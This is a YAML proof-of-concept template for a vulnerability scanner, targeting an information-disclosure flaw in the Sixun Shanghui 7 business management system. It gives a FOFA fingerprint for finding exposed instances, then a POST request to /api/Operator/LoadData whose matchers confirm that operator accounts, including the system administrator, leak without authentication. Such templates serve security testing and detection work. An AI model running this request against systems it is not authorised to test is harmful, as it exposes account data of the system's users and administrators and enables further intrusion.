id: poc-yaml-sixun-shanghui7-bms-operator-info-leak
info:
  name: 思迅商慧7商业管理系统 Operator 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 思迅商慧7商业管理系统
  fofa: app="思迅商慧7商业管理系统"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"思迅商慧7商业管理系统")
- method: POST
  path: /api/Operator/LoadData
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept: '*/*'
  data: loadAll=false&oper_role=&field=&operator=&value=1001&gridFlag=OperatorList&page=1&rows=10
  expression: status_code == 200 && contains(body,"\"oper_status\":\"正常\"") && contains(body,"\"oper_name\":")
    && contains(body,"系统管理员") && contains(body,"\"success\":true") && contains(headers,"application/json")
variables: {}
transport: http
